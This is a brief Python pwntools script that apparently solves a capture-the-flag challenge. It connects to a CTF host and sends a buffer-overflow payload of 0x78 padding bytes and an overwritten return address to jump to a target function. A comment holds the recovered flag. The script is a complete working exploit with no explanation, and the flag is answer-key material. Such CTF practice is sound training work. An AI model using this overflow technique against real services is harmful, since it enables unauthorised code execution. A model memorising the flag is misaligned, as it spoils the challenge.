from pwn import *

p = remote("ctf.csd.lol", 4003)

p.recv()
payload = b"A"*0x78 + p64(0x4011f6)
p.send(payload)
p.interactive()

# csd{Br0uGH7_t0_YOU_8y_W15H_D0t_CoM}